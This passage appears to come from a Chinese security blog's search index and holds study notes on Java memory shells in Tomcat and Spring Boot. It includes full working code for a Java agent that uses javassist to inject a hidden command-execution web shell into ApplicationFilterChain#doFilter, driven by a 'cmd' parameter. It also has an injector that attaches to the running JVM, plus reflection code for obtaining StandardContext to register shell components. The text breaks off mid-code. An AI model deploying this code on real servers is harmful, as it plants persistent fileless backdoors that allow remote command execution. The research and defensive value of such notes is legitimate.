src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220617164110344.png\" alt=\"image-20220617164110344\"></p>\n<p>综上，总算是能理解这个 代理 的意思了，java目前通过agent给我们提供了一个可以修改类字节码的入口，至于怎么修改，用什么实现，下面就学习学习 javassist技术</p>\n<h2 id=\"javassist\"><a href=\"#javassist\" class=\"headerlink\" title=\"javassist\"></a>javassist</h2><p>字节码编程直接贴一个链接吧：<a href=\"https://www.w3cschool.cn/article/35230124.html\">关于Java字节码编程javassist的详细介绍</a></p>\n<h2 id=\"内存马实现\"><a href=\"#内存马实现\" class=\"headerlink\" title=\"内存马实现\"></a>内存马实现</h2><h3 id=\"合适方法的寻找\"><a href=\"#合适方法的寻找\" class=\"headerlink\" title=\"合适方法的寻找\"></a>合适方法的寻找</h3><p>现在可以实现修改方法体了，以springboot为例，我们去寻找一个spring中一定会用到的方法，然后修改它的方法插入恶意代码，即可实现利用所以这个类中的方法需要满足两个要求</p>\n<ol>\n<li>该方法一定会被执行</li>\n<li>不会影响正常的业务逻辑</li>\n</ol>\n<p>在 tomcat 中，针对用户的请求，先通过filter后再传入到servlet中，而filter调用的实现在ApplicationFilterChain#doFilter()中</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220618114854456.png\" alt=\"image-20220618114854456\"></p>\n<p>其中会调用 internalDoFilter()方法去实现真正的filter调用</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220618115224539.png\" alt=\"image-20220618115224539\"></p>\n<p>综上，两个方法 doFilter 和 internalDoFilter 都是可以进行插入恶意代码的，而且还有request和 response，可以获取用户请求并将执行结果返回，堪称完美，当然肯定还有其他的 hook方法，比如：Servlet-API 中更具有通用性的  javax.servlet.http.HttpServlet 的 service 方法、Tomcat中默认存在的Filter：WsFilter等等</p>\n<h3 id=\"注入测试\"><a href=\"#注入测试\" class=\"headerlink\" title=\"注入测试\"></a>注入测试</h3><p>springboot 一个正常 /books 路由，一个fastjson反序列化路由/ fastjson</p>\n<p>注意点：</p>\n<ul>\n<li>Tomcat运行时环境是JRE环境，没有tools.jar，可以通过反射+URLClassLoader加载</li>\n</ul>\n<p>agent.jar</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//agentmain.java</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.instrument.Instrumentation;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.instrument.UnmodifiableClassException;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">agentmain</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">agentmain</span><span class=\"params\">(String agentArgs, Instrumentation inst)</span> <span class=\"keyword\">throws</span> UnmodifiableClassException </span>&#123;</span><br><span class=\"line\">        Class[] classes = inst.getAllLoadedClasses();</span><br><span class=\"line\">        <span class=\"comment\">// 判断类是否已经加载</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (Class aClass : classes) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (aClass.getName().equals(definetransform.editClassName)) &#123;</span><br><span class=\"line\">                <span class=\"comment\">// 添加 Transformer</span></span><br><span class=\"line\">                inst.addTransformer(<span class=\"keyword\">new</span> definetransform(), <span class=\"keyword\">true</span>);</span><br><span class=\"line\">                <span class=\"comment\">// 触发 Transformer</span></span><br><span class=\"line\">                inst.retransformClasses(aClass);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//definetransform.java</span></span><br><span class=\"line\"><span class=\"comment\">//写shell的实现</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> javassist.ClassClassPath;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javassist.ClassPool;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javassist.CtClass;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javassist.CtMethod;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.instrument.IllegalClassFormatException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.security.ProtectionDomain;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">definetransform</span> <span class=\"keyword\">implements</span> <span class=\"title\">ClassFileTransformer</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> String editClassName = <span class=\"string\">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>;</span><br><span class=\"line\">    <span class=\"comment\">//public static final String editClassName = &quot;org.apache.tomcat.websocket.server.WsFilter&quot;;</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> String editMethod = <span class=\"string\">&quot;doFilter&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class=\"keyword\">byte</span>[] classfileBuffer) <span class=\"keyword\">throws</span> IllegalClassFormatException &#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">            ClassPool cp = ClassPool.getDefault();</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (classBeingRedefined != <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">                ClassClassPath ccp = <span class=\"keyword\">new</span> ClassClassPath(classBeingRedefined);</span><br><span class=\"line\">                cp.insertClassPath(ccp);</span><br><span class=\"line\">                CtClass ctc = cp.get(editClassName);</span><br><span class=\"line\">                CtMethod method = ctc.getDeclaredMethod(editMethod);</span><br><span class=\"line\">                String source = <span class=\"string\">&quot;javax.servlet.http.HttpServletRequest req =  request;\\n&quot;</span>+</span><br><span class=\"line\">                        <span class=\"string\">&quot;javax.servlet.http.HttpServletResponse res = response;\\n&quot;</span>+</span><br><span class=\"line\">                        <span class=\"string\">&quot;java.lang.String cmd = request.getParameter(\\&quot;cmd\\&quot;);\\n&quot;</span>+</span><br><span class=\"line\">                        <span class=\"string\">&quot;if(cmd != null)&#123;\\n&quot;</span>+</span><br><span class=\"line\">                        <span class=\"string\">&quot;   try &#123;\\n&quot;</span> +</span><br><span class=\"line\">                        <span class=\"string\">&quot;        java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();\\n&quot;</span> +</span><br><span class=\"line\">                        <span class=\"string\">&quot;        java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(in));\\n&quot;</span> +</span><br><span class=\"line\">                        <span class=\"string\">&quot;        String line;\\n&quot;</span> +</span><br><span class=\"line\">                        <span class=\"string\">&quot;        StringBuilder sb = new StringBuilder(\\&quot;\\&quot;);\\n&quot;</span> +</span><br><span class=\"line\">                        <span class=\"string\">&quot;        while ((line=reader.readLine()) != null)&#123;\\n&quot;</span> +</span><br><span class=\"line\">                        <span class=\"string\">&quot;            sb.append(line).append(\\&quot;\\\\n\\&quot;);\\n&quot;</span> +</span><br><span class=\"line\">                        <span class=\"string\">&quot;        &#125;\\n&quot;</span> +</span><br><span class=\"line\">                        <span class=\"string\">&quot;        response.getOutputStream().print(sb.toString());\\n&quot;</span> +</span><br><span class=\"line\">                        <span class=\"string\">&quot;        response.getOutputStream().flush();\\n&quot;</span> +</span><br><span class=\"line\">                        <span class=\"string\">&quot;        response.getOutputStream().close();\\n&quot;</span> +</span><br><span class=\"line\">                        <span class=\"string\">&quot;    &#125; catch (Exception e)&#123;\\n&quot;</span> +</span><br><span class=\"line\">                        <span class=\"string\">&quot;        e.printStackTrace();\\n&quot;</span> +</span><br><span class=\"line\">                        <span class=\"string\">&quot;    &#125;\\n&quot;</span> +</span><br><span class=\"line\">                        <span class=\"string\">&quot;&#125;&quot;</span>;</span><br><span class=\"line\">                method.insertBefore(source);</span><br><span class=\"line\">                <span class=\"keyword\">byte</span>[] bytes = ctc.toBytecode();</span><br><span class=\"line\">                ctc.detach();</span><br><span class=\"line\">                <span class=\"keyword\">return</span> bytes;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (Exception e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>inject.java 将注入写到static代码块，编译为class</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.io.File;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.net.URL;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.net.URLClassLoader;</span><br><span class=\"line\"><span class=\"comment\">//agent的注入</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">inject</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">static</span> &#123;</span><br><span class=\"line\">        String agentpath = <span class=\"string\">&quot;C:\\\\Users\\\\cys\\\\Desktop\\\\memoryshell\\\\agent.jar&quot;</span>;</span><br><span class=\"line\">        String toolsjarpath = System.getProperty(<span class=\"string\">&quot;java.home&quot;</span>).replace(<span class=\"string\">&quot;jre&quot;</span>,<span class=\"string\">&quot;lib&quot;</span>) + File.separator + <span class=\"string\">&quot;tools.jar&quot;</span>;</span><br><span class=\"line\">        File toolsjar = <span class=\"keyword\">new</span> File(toolsjarpath);</span><br><span class=\"line\">        URL url = <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">            url = toolsjar.toURI().toURL();</span><br><span class=\"line\">            URLClassLoader urlClassLoader = <span class=\"keyword\">new</span> URLClassLoader(<span class=\"keyword\">new</span> URL[]&#123;url&#125;, <span class=\"keyword\">null</span>);</span><br><span class=\"line\">            <span class=\"comment\">// 加载virtualmachine</span></span><br><span class=\"line\">            Class&lt;?&gt; virtualMachine = urlClassLoader.loadClass(<span class=\"string\">&quot;com.sun.tools.attach.VirtualMachine&quot;</span>);</span><br><span class=\"line\">            Class&lt;?&gt; VirtualMachineDescriptor = urlClassLoader.loadClass(<span class=\"string\">&quot;com.sun.tools.attach.VirtualMachineDescriptor&quot;</span>);</span><br><span class=\"line\">            java.lang.reflect.Method listMethod = virtualMachine.getDeclaredMethod(<span class=\"string\">&quot;list&quot;</span>,<span class=\"keyword\">new</span> Class[]&#123;&#125;);</span><br><span class=\"line\">            java.util.List&lt;Object&gt; pidlist = (java.util.List&lt;Object&gt;) listMethod.invoke(<span class=\"keyword\">null</span>, <span class=\"keyword\">new</span> Object[]&#123;&#125;);</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; pidlist.size(); i++) &#123;</span><br><span class=\"line\">                Object o = pidlist.get(i);</span><br><span class=\"line\">                java.lang.reflect.Method displayName = o.getClass().getSuperclass().getDeclaredMethod(<span class=\"string\">&quot;displayName&quot;</span>);</span><br><span class=\"line\">                Object name = displayName.invoke(o, <span class=\"keyword\">new</span> Object[]&#123;&#125;);</span><br><span class=\"line\">                <span class=\"comment\">// 0x04 找到Tomcat进程，attach</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> (name.toString().contains(<span class=\"string\">&quot;com.example.SpringbootApplication&quot;</span>)) &#123;</span><br><span class=\"line\">                    java.lang.reflect.Method attach = virtualMachine.getDeclaredMethod(<span class=\"string\">&quot;attach&quot;</span>, <span class=\"keyword\">new</span> Class[]&#123;VirtualMachineDescriptor&#125;);</span><br><span class=\"line\">                    <span class=\"comment\">// 这里调的attch重载方法，attach可以通过pid也可通过相关jvm进程的vrtualMachineDescriptor对象传参</span></span><br><span class=\"line\">                    Object machin = attach.invoke(virtualMachine, <span class=\"keyword\">new</span> Object[]&#123;o&#125;);</span><br><span class=\"line\">                    <span class=\"comment\">// 0x05 loadAgent</span></span><br><span class=\"line\">                    java.lang.reflect.Method loadAgent = machin.getClass().getSuperclass().getSuperclass().getDeclaredMethod(<span class=\"string\">&quot;loadAgent&quot;</span>, <span class=\"keyword\">new</span> Class[]&#123;String.class&#125;);</span><br><span class=\"line\">                    loadAgent.invoke(machin, <span class=\"keyword\">new</span> Object[]&#123;agentpath&#125;);</span><br><span class=\"line\">                    <span class=\"comment\">//0x06 detach</span></span><br><span class=\"line\">                    java.lang.reflect.Method detach = virtualMachine.getDeclaredMethod(<span class=\"string\">&quot;detach&quot;</span>, <span class=\"keyword\">new</span> Class[]&#123;&#125;);</span><br><span class=\"line\">                    detach.invoke(machin, <span class=\"keyword\">new</span> Object[]&#123;&#125;);</span><br><span class=\"line\">                    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;<span class=\"keyword\">catch</span> (Exception e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p> fastjson的JNDI注入</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220618155959790.png\" alt=\"image-20220618155959790\"></p>\n<p>结合反序列化，JNDI注入可以做到无文件落地的内存马注入</p>\n<h2 id=\"参考-2\"><a href=\"#参考-2\" class=\"headerlink\" title=\"参考\"></a>参考</h2><p><a href=\"https://xz.aliyun.com/t/9450\">Java Agent 从入门到内存马</a></p>\n","categories":["JavaSec"]},{"title":"JAVA内存马","url":"/2024/11/07/%E5%86%85%E5%AD%98%E9%A9%AC(%E4%B8%80)/","content":"<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2F6193d09c503d8e057afa1636_Java%20code%20review%20checklist-min-p-1600.jpeg\" alt=\"6193d09c503d8e057afa1636_Java code review checklist-min-p-1600\"></p>\n<a id=\"more\"></a>\n\n<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>环境：Tomcat8.5.73 + jdk1.8</p>\n<h1 id=\"前置知识\"><a href=\"#前置知识\" class=\"headerlink\" title=\"前置知识\"></a>前置知识</h1><h2 id=\"java-web三大组件\"><a href=\"#java-web三大组件\" class=\"headerlink\" title=\"java web三大组件\"></a>java web三大组件</h2><ul>\n<li>Servlet</li>\n<li>Filter</li>\n<li>Listener</li>\n</ul>\n<p>处理请求时，处理顺序如下</p>\n<blockquote>\n<p>请求 → Listener → Filter → Servlet</p>\n</blockquote>\n<h2 id=\"Tomcat相关\"><a href=\"#Tomcat相关\" class=\"headerlink\" title=\"Tomcat相关\"></a>Tomcat相关</h2><p>搬运自Y4tacker大佬 <a href=\"https://github.com/Y4tacker/JavaSec/blob/main/5.%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/Tomcat/Tomcat%E4%BB%8B%E7%BB%8D/Tomcat%E4%BB%8B%E7%BB%8D.md\">JavaSec/Tomcat介绍.md at main · Y4tacker/JavaSec (github.com)</a></p>\n<h3 id=\"主要功能\"><a href=\"#主要功能\" class=\"headerlink\" title=\"主要功能\"></a>主要功能</h3><p>Tomcat 作为Web服务器，实现了两个核心功能</p>\n<ul>\n<li><strong>Http 服务器功能：</strong>进行 Socket 通信(基于 TCP/IP)，解析 HTTP 报文</li>\n<li><strong>Servlet 容器功能：</strong>加载和管理 Servlet，由 Servlet 具体负责处理 Request 请求</li>\n</ul>\n<p>以上两个功能，分别对应着<strong>tomcat的两个核心组件连接器（Connector）和容器（Container）</strong>，连接器负责对外交流（完成 Http 服务器功能），容器负责内部处理（完成 Servlet 容器功能）</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220408095517957.png\" alt=\"image-20220408095517957\"></p>\n<ul>\n<li><strong>Server</strong> 代表整个 tomcat 服务器，一个 tomcat 只有一个 Server Server 中包含至少一个 Service 组件，用于提供具体服务。</li>\n<li><strong>Service</strong> 服务是 Server 内部的组件，一个Server可以包括多个Service。它将若干个 Connector 组件绑定到一个 Container</li>\n<li><strong>Connector</strong> 称为连接器，一个 Service 可以有多个 Connector，主要连接客户端请求,用于接受请求并将请求封装成 Request 和 Response，然后交给 Container 进 行处理，Container 处理完之后在交给 Connector 返回给客户端，接收不同的连接协议。</li>\n<li><strong>Container</strong> 称为容器，负责处理用户的 servlet 请求</li>\n</ul>\n<h3 id=\"Connector连接器\"><a href=\"#Connector连接器\" class=\"headerlink\" title=\"Connector连接器\"></a>Connector连接器</h3><p>连接器主要完成以下三个核心功能：</p>\n<ul>\n<li>socket 通信，也就是网络编程</li>\n<li>解析处理应用层协议，封装成一个 Request 对象</li>\n<li>将 Request 转换为 ServletRequest，将 Response 转换为 ServletResponse</li>\n</ul>\n<p>以上分别对应三个组件 EndPoint、Processor、Adapter 来完成。Endpoint 负责提供请求字节流给Processor，Processor 负责提供 Tomcat 定义的 Request 对象给 Adapter，Adapter 负责提供标准的 ServletRequest 对象给 Servlet 容器。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220408095636418.png\" alt=\"image-20220408095636418\"></p>\n<p>Endpoint与Processor有一个组合名称为ProtocolHandler</p>\n<h3 id=\"Container容器\"><a href=\"#Container容器\" class=\"headerlink\" title=\"Container容器\"></a>Container容器</h3><p>Container组件又称作Catalina，其是Tomcat的核心。在Container中，有4种容器，分别是Engine、Host、Context、Wrapper。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220408095812036.png\" alt=\"image-20220408095812036\"></p>\n<p>四种容器的作用：</p>\n<ul>\n<li>Engine 表示整个 Catalina 的 Servlet 引擎，用来管理多个虚拟站点，一个 Service 最多只能有一个 Engine，但是一个引擎可包含多个 Host。实现类为<code>org.apache.catalina.core.StandardEngine</code></li>\n<li>Host 代表一个虚拟主机，或者说一个站点，可以给 Tomcat 配置多个虚拟主机地址，而一个虚拟主机下可包含多个 Context。实现类为<code>org.apache.catalina.core.StandardHost</code></li>\n<li>Context 表示一个 Web 应用程序，每一个Context都有唯一的path，一个Web应用可包含多个 Wrapper。实现类为<code>org.apache.catalina.core.StandardContext</code></li>\n<li>Wrapper 表示一个Servlet，负责管理整个 Servlet 的生命周期，包括装载、初始化、资源回收等。实现类为<code>org.apache.catalina.core.StandardWrapper</code></li>\n</ul>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220408095845813.png\" alt=\"image-20220408095845813\"></p>\n<h2 id=\"从HTTP请求到Servlet\"><a href=\"#从HTTP请求到Servlet\" class=\"headerlink\" title=\"从HTTP请求到Servlet\"></a>从HTTP请求到Servlet</h2><p>Tomcat使用<strong>Mapper组件</strong>来将用户请求的URL定位到某个Servlet。Mapper组件里保存了WEB应用的配置信息，也就是容器组件与访问路径的映射关系。比如Host容器里配置的域名、Context容器里的WEB应用路径以及Wrapper容器里Servlet映射的路径。</p>\n<p>Mapper组件通过解析请求URL里的域名和路径，再到自己保存的Map里去找，就能定位到一个Servlet。 最终一个请求URL只会定位到一个Wrapper容器，也就是一个Servlet 。</p>\n<h2 id=\"三种Context\"><a href=\"#三种Context\" class=\"headerlink\" title=\"三种Context\"></a>三种Context</h2><p>Tomcat中有如下三种Context: <strong>ServletContext、StandardContext、ApplicationContext</strong>。下面这张图很好的展现了这三个Context的结构。context实际上就是拥有当前中间件或框架处理请求、保存和控制servlet对象、保存和控制filter对象等功能的对象。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220409173327449.png\" alt=\"image-20220409173327449\"></p>\n<ul>\n<li><p>ServerletContext（是一个接口）</p>\n<p>通过 <strong>request.getServletContext()</strong> 获取到的是<strong>ApplicationContextFacade对象</strong>，它是对ServerletContext接口的实现类，该类提供了Web应用所有Servlet的视图，可以对某个Web应用的各种资源和功能进行访问。</p>\n<p>WEB容器在启动时，它会为每个Web应用程序都创建一个对应的ServletContext。<strong>它代表当前Web应用，并且它被所有客户端共享</strong>。</p>\n</li>\n<li><p>ApplicationContext</p>\n<p>ApplicationContext也是对ServerletContext接口的实现类，由上图可知该类被包装在<strong>ApplicationContextFacade</strong>类中。</p>\n</li>\n<li><p>StandardContext</p>\n<p>org.apache.catalina.Context接口的默认实现为<strong>StandardContext</strong>，而Context在Tomcat中代表一个web应用。ApplicationContext所实现的方法其实都是调用的StandardContext中的方法，<strong>StandardContext是Tomcat中真正起作用的Context</strong></p>\n</li>\n</ul>\n<h2 id=\"Tomcat中Context对象的获取\"><a href=\"#Tomcat中Context对象的获取\" class=\"headerlink\" title=\"Tomcat中Context对象的获取\"></a>Tomcat中Context对象的获取</h2><blockquote>\n<p>作为初学者，在借鉴文章时对这里进行思考可能利用的方式，对于为什么获取Context的对象，根据上面的图，可能是反射获取Context对象之后添加新的路由，编写对应的servlet，更改相关配置，然后到达目的</p>\n</blockquote>\n<p>对于Tomcat，一个Web应用中Context组件为<strong>org.apache.catalina.core.StandardContext的对象</strong>，在<strong>动态注册Servlet组件内存马</strong>时，<strong>获取StandContext对象成为关键点</strong>，通过哪种方式可以获取该对象，有以下几种方式</p>\n<h3 id=\"有request对象时\"><a href=\"#有request对象时\" class=\"headerlink\" title=\"有request对象时\"></a>有request对象时</h3><blockquote>\n<p>web应用中request.getServletContext是ApplicationContextFacade对象。该对象对ApplicationContext进行了封装，而ApplicationContext实例中又包含了StandardContext实例，所以当request存在的时候我们可以通过反射来获取StandardContext对象</p>\n</blockquote>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">ServletContext servletContext = request.getServletContext();<span class=\"comment\">//获取到applicationcontextFacade  </span></span><br><span class=\"line\">Field fieldApplicationContext = servletContext.getClass().getDeclaredField(<span class=\"string\">&quot;context&quot;</span>);<span class=\"comment\">//利用反射获取ApplicationContext对象  </span></span><br><span class=\"line\">fieldApplicationContext.setAccessible(<span class=\"keyword\">true</span>);<span class=\"comment\">//使私有可获取  </span></span><br><span class=\"line\">ApplicationContext applicationContext = (ApplicationContext) fieldApplicationContext.get(servletContext);<span class=\"comment\">//获取到ApplicationContext对象  </span></span><br><span class=\"line\"></span><br><span class=\"line\">Field fieldStandardContext = applicationContext.getClass().getDeclaredField(<span class=\"string\">&quot;context&quot;</span>);<span class=\"comment\">//利用反射获取StandardContext对象  </span></span><br><span class=\"line\">fieldStandardContext.setAccessible(<span class=\"keyword\">true</span>);<span class=\"comment\">//使私有可获取  </span></span><br><span class=\"line\">StandardContext standardContext = (StandardContext) fieldStandardContext.get(applicationContext);<span class=\"comment\">//获取到StandardContext对象</span></span><br></pre></td></tr></table></figure>\n\n<p>看到还存在一种方式</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Field reqF = request.getClass().getDeclaredField(<span class=\"string\">&quot;request&quot;</span>);</span><br><span class=\"line\">reqF.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">Request req = (Request) reqF.get(request);</span><br><span class=\"line\">StandardContext stdcontext = (StandardContext) req.getContext();</span><br></pre></td></tr></table></figure>\n\n<p>实际 Tomcat 在使用 request 的时候不是用的 Request 这个类，而是 RequestFacade，来看一下</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220428110656959.png\" alt=\"image-20220428110656959\"></p>\n<p>而在Request中，存在方法 getContext，获取context</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220428110742571.png\" alt=\"image-20220428110742571\"></p>\n<h3 id=\"无request对象时-坑\"><a href=\"#无request对象时-坑\" class=\"headerlink\" title=\"无request对象时(坑)\"></a>无request对象时(坑)</h3><p>存在以下几种方式</p>\n<ul>\n<li><strong>currentThread中的ContextClassLoader中获取</strong></li>\n<li><strong>ThreadLocal中获取</strong></li>\n<li><strong>从MBean中获取</strong></li>\n</ul>\n<p>实现方式先挖坑</p>\n<p><a href=\"https://xz.aliyun.com/t/11003#toc-4\">JAVA内存马的“一生” - 先知社区 (aliyun.com)</a></p>\n<p><a href=\"https://myzxcg.com/2021/10/Tomcat-%E6%9E%B6%E6%9E%84%E4%B8%8EContext%E5%88%86%E6%9E%90/#%E8%8E%B7%E5%8F%96standardcontext\">Tomcat 架构与Context分析 | MYZXCG</a></p>\n<p><a href=\"https://xz.aliyun.com/t/9914#toc-5\">Java内存马：一种Tomcat全版本获取StandardContext的新方法 - 先知社区 (aliyun.com)</a></p>\n<h1 id=\"内存马的分类\"><a href=\"#内存马的分类\" class=\"headerlink\" title=\"内存马的分类\"></a>内存马的分类</h1><p>大致分为三类</p>\n<ul>\n<li>基于动态添加Servlet组件的内存马</li>\n<li>基于动态添加框架组件的内存马</li>\n<li>基于 Javaagent 和 Javassist 技术的内存马</li>\n</ul>\n<p>将按照顺序进行学习与实现</p>\n<h1 id=\"内存马的实现\"><a href=\"#内存马的实现\" class=\"headerlink\" title=\"内存马的实现\"></a>内存马的实现</h1><h2 id=\"动态注册Servlet三大件\"><a href=\"#动态注册Servlet三大件\" class=\"headerlink\" title=\"动态注册Servlet三大件\"></a>动态注册Servlet三大件</h2><p>这部分就是对于 <strong>Listener、Filter、servlet</strong> 进行对应的实现</p>\n<h3 id=\"Listener\"><a href=\"#Listener\" class=\"headerlink\" title=\"Listener\"></a>Listener</h3><p>Listener即为监听器，用来监听对象或流程的创建与销毁，分为三类</p>\n<ul>\n<li>ServletContext，服务器启动与终止时触发</li>\n<li>Session，与Session操作有关</li>\n<li>Request，访问服务时触发</li>\n</ul>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220427223133595.png\" alt=\"image-20220427223133595\"></p>\n<p>其中Request对象的监听器适合做内存马。</p>\n<p>对于listener的引入，需要实现两种接口<strong>LifecycleListener</strong>和原生<strong>EvenListener</strong></p>\n<p>实现了<strong>LifecycleListener</strong>接口的监听器一般作用于tomcat初始化启动阶段，此时客户端的请求还没进入解析阶段，不适合用于内存马。</p>\n<p>所以来看另一个<strong>EventListener</strong>接口，在Tomcat中，自定义了很多继承于<strong>EventListener</strong>的接口，应用于各个对象的监听。</p>\n<p>idea中 <strong>ctrl+H</strong> 查看实现接口的类</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220427230228713.png\" alt=\"image-20220427230228713\"></p>\n<p>其中就有ServletRequestListener，来看一下这个接口，提供了两个方法，用于监听<code>ServletRequest</code>对象的创建和销毁，当我们访问任意资源，无论是servlet、jsp还是静态资源，都会触发<code>requestInitialized</code>方法，这样可以在访问请求时，实现恶意代码的触发</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220427230436522.png\" alt=\"image-20220427230436522\"></p>\n<h4 id=\"简单监听器的实现\"><a href=\"#简单监听器的实现\" class=\"headerlink\" title=\"简单监听器的实现\"></a>简单监听器的实现</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> javax.servlet.ServletRequestEvent;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.servlet.ServletRequestListener;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">TestListener</span> <span class=\"keyword\">implements</span> <span class=\"title\">ServletRequestListener</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">requestDestroyed</span><span class=\"params\">(ServletRequestEvent servletRequestEvent)</span> </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;requestDestroyed&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">requestInitialized</span><span class=\"params\">(ServletRequestEvent servletRequestEvent)</span> </span>&#123;</span><br><span class=\"line\">        System.out.println(<span 